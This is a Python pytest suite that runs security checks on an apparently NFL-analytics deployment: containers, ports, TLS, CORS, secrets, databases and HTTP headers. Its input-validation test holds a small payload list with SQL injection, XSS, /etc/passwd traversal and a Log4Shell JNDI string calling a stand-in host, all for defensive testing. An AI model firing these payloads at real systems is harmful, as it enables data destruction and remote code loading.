"""
Security Validation Tests

Comprehensive security tests for production deployment including
container security, network security, and configuration validation.

Requirements covered: 8.1, 8.2, 8.3
"""

import pytest
import docker
import subprocess
import requests
import json
import yaml
import os
import socket
import ssl
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import tempfile
import shutil


class TestContainerSecurity:
    """Test container security configurations."""
    
    def setup_method(self):
        """Set up test environment."""
        self.docker_client = docker.from_env()
        self.test_containers = []
    
    def teardown_method(self):
        """Clean up test containers."""
        for container in self.test_containers:
            try:
                container.stop(timeout=5)
                container.remove()
            except docker.errors.NotFound:
                pass
    
    def test_container_runs_as_non_root(self):
        """Test containers run as non-root user."""
        # Test API container
        try:
            container = self.docker_client.containers.run(
                "nfl-analyzer-api:latest",
                command="id",
                remove=False,
                detach=False
            )
            self.test_containers.append(container)
            
            # Get container output
            logs = container.logs().decode().strip()
            
            # Should not be root (uid=0)
            assert "uid=0" not in logs, "API container runs as root user"
            assert "app" in logs, "API container should run as app user"
            
        except docker.errors.ImageNotFound:
            pytest.skip("API image not built for security test")
    
    def test_container_filesystem_readonly(self):
        """Test containers use read-only filesystem where possible."""
        dockerfile_path = Path("Dockerfile")
        if not dockerfile_path.exists():
            pytest.skip("Dockerfile not found")
        
        with open(dockerfile_path, 'r') as f:
            dockerfile_content = f.read()
        
        # Check for security best practices
        # Should not run as root
        assert "USER root" not in dockerfile_content or "USER app" in dockerfile_content
        
        # Should use COPY instead of ADD for security
        add_commands = [line for line in dockerfile_content.split('\n') if line.strip().startswith('ADD')]
        for add_cmd in add_commands:
            # ADD should only be used for tar extraction or URLs
            if not any(ext in add_cmd for ext in ['.tar', '.tgz', '.tar.gz', 'http']):
                print(f"Consider using COPY instead of ADD: {add_cmd}")
    
    def test_container_capabilities(self):
        """Test containers don't have unnecessary capabilities."""
        compose_file = 'docker-compose.yml'
        if not Path(compose_file).exists():
            pytest.skip(f"{compose_file} not found")
        
        with open(compose_file, 'r') as f:
            compose_config = yaml.safe_load(f)
        
        services = compose_config.get('services', {})
        
        for service_name, service_config in services.items():
            # Check for capability restrictions
            cap_drop = service_config.get('cap_drop', [])
            cap_add = service_config.get('cap_add', [])
            
            # Should drop unnecessary capabilities
            if cap_add:
                print(f"Service {service_name} adds capabilities: {cap_add}")
            
            # Privileged mode should not be used
            privileged = service_config.get('privileged', False)
            assert not privileged, f"Service {service_name} runs in privileged mode"
    
    def test_secrets_management(self):
        """Test secrets are properly managed."""
        # Check .gitignore includes secret files
        gitignore_path = Path('.gitignore')
        if gitignore_path.exists():
            with open(gitignore_path, 'r') as f:
                gitignore_content = f.read()
            
            secret_patterns = ['.env', '*.key', '*.pem', '*.p12', 'secrets/']
            for pattern in secret_patterns:
                assert pattern in gitignore_content, f"Secret pattern {pattern} not in .gitignore"
        
        # Check environment files don't contain real secrets
        env_files = ['.env.example', '.env.production']
        for env_file in env_files:
            env_path = Path(env_file)
            if env_path.exists():
                with open(env_path, 'r') as f:
                    content = f.read()
                
                # Should not contain obvious real secrets
                dangerous_patterns = [
                    'password123', 'admin123', 'secret123',
                    'sk-', 'ghp_', 'gho_'  # Common API key prefixes
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern not in content.lower(), \
                        f"Potential real secret found in {env_file}: {pattern}"
    
    def test_image_vulnerability_scan(self):
        """Test Docker images for known vulnerabilities."""
        # This would typically use tools like Trivy, Snyk, or Clair
        # For now, we'll do basic checks
        
        try:
            # Check if Trivy is available
            result = subprocess.run(['trivy', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                # Run Trivy scan on the image
                scan_result = subprocess.run([
                    'trivy', 'image', '--format', 'json', 
                    '--severity', 'HIGH,CRITICAL',
                    'nfl-analyzer-api:latest'
                ], capture_output=True, text=True, timeout=300)
                
                if scan_result.returncode == 0:
                    scan_data = json.loads(scan_result.stdout)
                    
                    # Check for critical vulnerabilities
                    critical_vulns = []
                    for result in scan_data.get('Results', []):
                        for vuln in result.get('Vulnerabilities', []):
                            if vuln.get('Severity') == 'CRITICAL':
                                critical_vulns.append(vuln.get('VulnerabilityID'))
                    
                    if critical_vulns:
                        print(f"Critical vulnerabilities found: {critical_vulns}")
                        # Don't fail the test automatically, but warn
                
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            pytest.skip("Trivy not available for vulnerability scanning")


class TestNetworkSecurity:
    """Test network security configurations."""
    
    def test_port_exposure(self):
        """Test only necessary ports are exposed."""
        compose_file = 'docker-compose.yml'
        if not Path(compose_file).exists():
            pytest.skip(f"{compose_file} not found")
        
        with open(compose_file, 'r') as f:
            compose_config = yaml.safe_load(f)
        
        services = compose_config.get('services', {})
        
        # Define allowed exposed ports
        allowed_ports = {
            'frontend': ['3000'],
            'api': ['8000'],
            'nginx': ['80', '443'],
            'prometheus': ['9090'],
            'grafana': ['3001', '3000'],
            'mongodb': ['27017'],  # Should be restricted in production
            'redis': ['6379']      # Should be restricted in production
        }
        
        for service_name, service_config in services.items():
            ports = service_config.get('ports', [])
            
            for port_mapping in ports:
                if isinstance(port_mapping, str):
                    host_port = port_mapping.split(':')[0]
                elif isinstance(port_mapping, dict):
                    host_port = str(port_mapping.get('published', ''))
                else:
                    host_port = str(port_mapping)
                
                if service_name in allowed_ports:
                    allowed = allowed_ports[service_name]
                    if host_port not in allowed:
                        print(f"Service {service_name} exposes unexpected port: {host_port}")
    
    def test_ssl_configuration(self):
        """Test SSL/TLS configuration."""
        # Check nginx SSL configuration
        nginx_configs = ['nginx/nginx.conf', 'nginx/nginx.prod.conf']
        
        for config_path in nginx_configs:
            if not Path(config_path).exists():
                continue
            
            with open(config_path, 'r') as f:
                nginx_config = f.read()
            
            if 'ssl' in nginx_config:
                # Check SSL best practices
                ssl_checks = [
                    'ssl_protocols TLSv1.2 TLSv1.3',
                    'ssl_ciphers',
                    'ssl_prefer_server_ciphers',
                    'ssl_session_cache',
                    'ssl_session_timeout'
                ]
                
                missing_configs = []
                for check in ssl_checks:
                    if check.split()[0] not in nginx_config:
                        missing_configs.append(check.split()[0])
                
                if missing_configs:
                    print(f"Missing SSL configurations in {config_path}: {missing_configs}")
    
    def test_cors_security(self):
        """Test CORS configuration security."""
        try:
            # Test CORS headers
            response = requests.options(
                'http://localhost:8000/health',
                headers={'Origin': 'http://malicious-site.com'},
                timeout=10
            )
            
            cors_origin = response.headers.get('Access-Control-Allow-Origin')
            
            # Should not allow all origins in production
            if cors_origin == '*':
                print("Warning: CORS allows all origins (*)")
            
            # Should have proper CORS methods
            cors_methods = response.headers.get('Access-Control-Allow-Methods', '')
            dangerous_methods = ['DELETE', 'PUT', 'PATCH']
            
            for method in dangerous_methods:
                if method in cors_methods:
                    print(f"Warning: CORS allows {method} method")
        
        except requests.exceptions.ConnectionError:
            pytest.skip("API service not running for CORS test")
    
    def test_rate_limiting(self):
        """Test rate limiting is configured."""
        try:
            # Make multiple rapid requests
            responses = []
            for _ in range(20):
                response = requests.get('http://localhost:8000/health', timeout=5)
                responses.append(response.status_code)
            
            # Check if rate limiting is active
            rate_limited = any(status == 429 for status in responses)
            
            if not rate_limited:
                print("Warning: No rate limiting detected")
            else:
                print("Rate limiting is active")
        
        except requests.exceptions.ConnectionError:
            pytest.skip("API service not running for rate limiting test")


class TestConfigurationSecurity:
    """Test security of configuration files."""
    
    def test_environment_variable_security(self):
        """Test environment variables don't expose secrets."""
        compose_files = ['docker-compose.yml', 'docker-compose.prod.yml']
        
        for compose_file in compose_files:
            if not Path(compose_file).exists():
                continue
            
            with open(compose_file, 'r') as f:
                compose_config = yaml.safe_load(f)
            
            services = compose_config.get('services', {})
            
            for service_name, service_config in services.items():
                environment = service_config.get('environment', [])
                
                if isinstance(environment, list):
                    for env_var in environment:
                        if isinstance(env_var, str) and '=' in env_var:
                            key, value = env_var.split('=', 1)
                            
                            # Check for hardcoded secrets
                            if any(secret in key.upper() for secret in ['PASSWORD', 'SECRET', 'KEY', 'TOKEN']):
                                if value and not value.startswith('${'):
                                    print(f"Warning: Hardcoded secret in {service_name}: {key}")
    
    def test_file_permissions(self):
        """Test file permissions are secure."""
        sensitive_files = [
            '.env.production',
            'nginx/ssl/',
            'scripts/',
        ]
        
        for file_path in sensitive_files:
            path = Path(file_path)
            if path.exists():
                # Check file permissions (Unix-like systems)
                try:
                    stat_info = path.stat()
                    mode = oct(stat_info.st_mode)[-3:]
                    
                    # Sensitive files should not be world-readable
                    if mode.endswith('4') or mode.endswith('6') or mode.endswith('7'):
                        print(f"Warning: {file_path} is world-readable: {mode}")
                
                except (OSError, AttributeError):
                    # Skip on systems that don't support file permissions
                    pass
    
    def test_default_credentials(self):
        """Test for default credentials."""
        config_files = [
            'docker-compose.yml',
            'docker-compose.prod.yml',
            '.env.example'
        ]
        
        default_patterns = [
            'admin:admin',
            'root:root',
            'password:password',
            'admin:password',
            'user:user'
        ]
        
        for config_file in config_files:
            if not Path(config_file).exists():
                continue
            
            with open(config_file, 'r') as f:
                content = f.read().lower()
            
            for pattern in default_patterns:
                if pattern in content:
                    print(f"Warning: Default credential pattern found in {config_file}: {pattern}")


class TestDatabaseSecurity:
    """Test database security configurations."""
    
    def test_mongodb_security(self):
        """Test MongoDB security configuration."""
        compose_files = ['docker-compose.yml', 'docker-compose.prod.yml']
        
        for compose_file in compose_files:
            if not Path(compose_file).exists():
                continue
            
            with open(compose_file, 'r') as f:
                compose_config = yaml.safe_load(f)
            
            mongodb_service = compose_config.get('services', {}).get('mongodb', {})
            
            if mongodb_service:
                # Check authentication is enabled
                environment = mongodb_service.get('environment', [])
                
                auth_enabled = False
                for env_var in environment:
                    if isinstance(env_var, str):
                        if 'MONGO_INITDB_ROOT_USERNAME' in env_var:
                            auth_enabled = True
                            break
                
                assert auth_enabled, f"MongoDB authentication not configured in {compose_file}"
                
                # Check for authentication in command
                command = mongodb_service.get('command', '')
                if command and '--auth' not in command:
                    print(f"Warning: MongoDB --auth flag not found in {compose_file}")
    
    def test_redis_security(self):
        """Test Redis security configuration."""
        compose_files = ['docker-compose.yml', 'docker-compose.prod.yml']
        
        for compose_file in compose_files:
            if not Path(compose_file).exists():
                continue
            
            with open(compose_file, 'r') as f:
                compose_config = yaml.safe_load(f)
            
            redis_service = compose_config.get('services', {}).get('redis', {})
            
            if redis_service:
                # Check password is configured
                command = redis_service.get('command', '')
                
                if 'requirepass' not in command:
                    print(f"Warning: Redis password not configured in {compose_file}")
                
                # Check for password in environment
                environment = redis_service.get('environment', [])
                redis_password_set = any(
                    'REDIS_PASSWORD' in str(env_var) for env_var in environment
                )
                
                if not redis_password_set and 'requirepass' not in command:
                    print(f"Warning: Redis authentication not properly configured in {compose_file}")


class TestApplicationSecurity:
    """Test application-level security."""
    
    def test_security_headers(self):
        """Test security headers are present."""
        try:
            response = requests.get('http://localhost:8000/health', timeout=10)
            headers = response.headers
            
            # Required security headers
            required_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': None,  # Should be present for HTTPS
                'Content-Security-Policy': None,
            }
            
            missing_headers = []
            for header, expected_value in required_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                elif expected_value and isinstance(expected_value, list):
                    if headers[header] not in expected_value:
                        print(f"Warning: {header} has unexpected value: {headers[header]}")
                elif expected_value and headers[header] != expected_value:
                    print(f"Warning: {header} has unexpected value: {headers[header]}")
            
            if missing_headers:
                print(f"Missing security headers: {', '.join(missing_headers)}")
        
        except requests.exceptions.ConnectionError:
            pytest.skip("API service not running for security headers test")
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities."""
        try:
            # Test server header
            response = requests.get('http://localhost:8000/health', timeout=10)
            server_header = response.headers.get('Server', '')
            
            # Should not reveal detailed server information
            if any(info in server_header.lower() for info in ['apache', 'nginx', 'iis']):
                version_info = any(char.isdigit() for char in server_header)
                if version_info:
                    print(f"Warning: Server header reveals version info: {server_header}")
            
            # Test error responses
            error_response = requests.get('http://localhost:8000/nonexistent', timeout=10)
            error_content = error_response.text.lower()
            
            # Should not reveal stack traces or internal paths
            sensitive_info = ['traceback', 'exception', '/app/', '/usr/', 'python']
            disclosed_info = [info for info in sensitive_info if info in error_content]
            
            if disclosed_info:
                print(f"Warning: Error response may disclose sensitive info: {disclosed_info}")
        
        except requests.exceptions.ConnectionError:
            pytest.skip("API service not running for information disclosure test")
    
    def test_input_validation(self):
        """Test input validation security."""
        try:
            # Test SQL injection patterns (if applicable)
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://malicious.com/a}"
            ]
            
            for malicious_input in malicious_inputs:
                # Test in query parameters
                response = requests.get(
                    f'http://localhost:8000/data/teams?search={malicious_input}',
                    timeout=10
                )
                
                # Should return 400 (bad request) or sanitized response, not 500
                if response.status_code == 500:
                    print(f"Warning: Server error with malicious input: {malicious_input}")
                
                # Response should not echo back the malicious input
                if malicious_input in response.text:
                    print(f"Warning: Malicious input reflected in response: {malicious_input}")
        
        except requests.exceptions.ConnectionError:
            pytest.skip("API service not running for input validation test")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])